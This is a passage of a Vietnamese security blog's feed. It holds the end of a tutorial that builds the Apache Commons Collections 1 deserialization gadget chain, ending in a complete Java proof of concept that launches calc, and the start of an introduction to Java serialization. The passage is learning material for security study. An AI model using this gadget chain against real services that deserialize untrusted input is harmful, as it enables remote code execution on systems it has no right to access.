class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Override.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Giai-quyet-van-de-cau-lenh-if"><a href="#Giai-quyet-van-de-cau-lenh-if" class="headerlink" title="Giải quyết vấn đề câu lệnh if"></a>Giải quyết vấn đề câu lệnh if</h3><p>Đến đây chúng ta vẫn chưa giải quyết vấn đề AnnotationInvocationHandler.readObject sử dụng hàm setValue. Đến đây các bạn nên debug để xử lý dễ dàng hơn nhé.</p><p>Đặt breakpoint ở dòng 339 và 341.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/debug-readObject.png"></p><p>Chúng ta cần var7 là một giá trị không null.</p><ul><li><code>Map var3 = var2.memberTypes()</code>, var2 là một Object kiểu AnnotationType của lớp kế thừa Annotation mà ta truyền vào ở đoạn <code>Object aihObject = aihClassConstructor.newInstance(Override.class, map);</code>. </li><li><code>var2 = AnnotationType.getInstance(this.type)</code>: var2 là một Object kiểu AnnotationType của lớp kế thừa Annotation mà ta truyền vào ở đoạn <code>Object aihObject = aihClassConstructor.newInstance(Override.class, map);</code></li><li>Code gốc khá là khó hiểu nên các bạn cứ hiểu đơn giản là trong AnnotationType có biến là memberTypes là một map với key là tên của biến trong <code>Override.class</code> mình cho vào, và value là kiểu của biến này. Ta gọi <code>var2.memberTypes()</code> sẽ trả về map này.<br>Vậy là lỗi ở đây xảy ra do interface Override không có biến nào cả. Chúng ta cần tìm Annotation khác có biến, ở đây chúng ta có annotation Target có một biến. Và đặt lại giá trị trong map là <code>key=value</code> và <code>value=bất kỳ</code>:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;testtt&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/var7-setOk.png"></p><p>Chúng ta đã vượt qua được if đầu tiên, và đồng thời if thứ 2 cũng đã vượt qua (không cần để ý đến vì toàn code gốc, đọc vào sẽ tốn thời gian của chúng ta thui à). Tuy nhiên vẫn chưa đủ để exec calc bởi vì chúng ta chưa xử lý vấn đề không điều khiển được <code>AnnotationTypeMismatchExceptionProxy</code>.</p><h3 id="Giai-quyet-van-de-khong-dieu-khien-duoc-AnnotationTypeMismatchExceptionProxy"><a href="#Giai-quyet-van-de-khong-dieu-khien-duoc-AnnotationTypeMismatchExceptionProxy" class="headerlink" title="Giải quyết vấn đề không điều khiển được AnnotationTypeMismatchExceptionProxy"></a>Giải quyết vấn đề không điều khiển được AnnotationTypeMismatchExceptionProxy</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/ConstantTransformer.png"></p><p>Đến đây mọi thứ được lập trình ra vẫn hỗ trợ cho chain của chúng ta :), lớp <code>ConstantTransformer</code> tương tự như InvokerTransformer tuy nhiên khi thực hiện transform, thằng <code>ConstantTransformer</code> sẽ trực tiếp return ra Object mình truyền vào ở hàm tạo chứ không phải Object truyền vào ở hàm Transform, Object này sẽ nối tiếp cho chuỗi sau.<br>Vậy là chúng ta có thể thực hiện <code>x.Transform(new AnnotationTypeMismatchExceptionProxy....)</code></p><p>Từ đây chúng ta có chuỗi hoàn chỉnh sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test-value&quot;</span>);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Chạy file và máy tính đã bật lên…</p><h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lời kết"></a>Lời kết</h2><p>Và đến đây là mình đã hoàn thành chain <em>Commons Collections 1</em> theo hướng TransformedMap, là chain đầu tiên mình làm và bước chân vào con đường Java Security. Thật sự rất nhiều kiến thức mình thiếu, qua việc đọc mã nguồn của nhà phát hành, cách những master OOP sử dụng nó trong các thư viện, mình cũng đã học được nhiều kiến thức về Java OOP. Hy vọng các bạn nào mới bước chân vào Java Security như mình hãy cố gắng nghiên cứu, đọc hiểu từ từ để có thể hiểu một cách rõ nhất về cái đẹp của Java OOP. Thực sự rất khó cho người mới học nên hy vọng các bạn có thể vượt qua ^^. </p><blockquote><p>Chúc các bạn học tốt~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Mot-vai-khai-niem-can-nam&quot;&gt;&lt;a href=&quot;#Mot-vai-khai-niem-can-nam&quot; class=&quot;headerlink&quot; title=&quot;Một vài khái niệm cần nắm&quot;&gt;&lt;/a&gt;Một vài khá</summary>
      
    
    
    
    <category term="Java" scheme="https://rayinaw.github.io/categories/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/categories/Java/Deserialization/"/>
    
    
    <category term="Java" scheme="https://rayinaw.github.io/tags/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/tags/Deserialization/"/>
    
    <category term="Commons Collections" scheme="https://rayinaw.github.io/tags/Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Java Deserialization</title>
    <link href="https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/"/>
    <id>https://rayinaw.github.io/2022/11/03/JavaDeserializationBasic/</id>
    <published>2022-11-02T19:50:28.000Z</published>
    <updated>2022-11-03T17:11:31.603Z</updated>
    
    <content type="html"><![CDATA[<p>Bài viết này là về những concept cơ bản của quá trình Serialization và Deserialization và cách mà lỗ hổng Java Deserialization được thực thi.</p><h1 id="Serialization-va-Deserialization"><a href="#Serialization-va-Deserialization" class="headerlink" title="Serialization và Deserialization"></a>Serialization và Deserialization</h1><h2 id="1-Serialization-va-deserialization-la-gi"><a href="#1-Serialization-va-deserialization-la-gi" class="headerlink" title="1. Serialization và deserialization là gì?"></a>1. Serialization và deserialization là gì?</h2><p>Hiểu một cách đơn giản hai quá trình này là:</p><ul><li>Serialization: Object –&gt; string hay bytecode(với Java)</li><li>Deserialization: string hoặc bytecode –&gt; Object</li></ul><h2 id="2-Nhung-qua-trinh-can-su-dung-den-Serialization"><a href="#2-Nhung-qua-trinh-can-su-dung-den-Serialization" class="headerlink" title="2. Những quá trình cần sử dụng đến Serialization:"></a>2. Những quá trình cần sử dụng đến Serialization:</h2><p>Lưu các đối tượng (ở đây xem như dữ liệu) vào bộ nhớ, tệp, cơ sở dữ liệu,…<br>Truyền các đối tượng qua mạng.<br>Chuyển đối tượng qua RMI.</p><h2 id="3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban"><a href="#3-Trien-khai-qua-trinh-Ser-va-Deser-co-ban" class="headerlink" title="3. Triển khai quá trình Ser và Deser cơ bản:"></a>3. Triển khai quá trình Ser và Deser cơ bản:</h2><p>Ở đây mình tạo một package SerialBasic rồi cho các lớp vào trong package đó.</p><p>File Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;name=&#x27;&quot;</span>+name+<span class="string">&quot;&#x27; age=&quot;</span>+age+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>File SerializationTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;rayinaw&quot;</span>, <span class="number">16</span>);</span><br><span class="line">        serialize(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>File DeserializationTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> SerialBasic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String FileName)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FileName));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">test</span> <span class="operator">=</span> (Person) deserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">        System.out.println(test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Đầu tiên ta chạy file SerializationTest.java, sau khi chạy xong ta thấy ở trong thư mục cha của src có một file ser.txt mới được tạo.<br>Tiếp đến chạy file DeserializationTest.java:</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/IntroduceToDeser/JavaDeserializationBasicPic1.webp"></p><p>Giải thích:</p><ul><li>SerializationTest.java<br>Ban đầu chúng ta khởi tạo một object new FileOutputStream(“ser.txt”), tiếp đến chúng ta khởi tạo một ObjectOutputStream. Rồi thực hiện oos.writeObject(obj) để viết đối tượng vào file ser.txt<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));  </span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure></li><li>DeserializationTest.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"><span 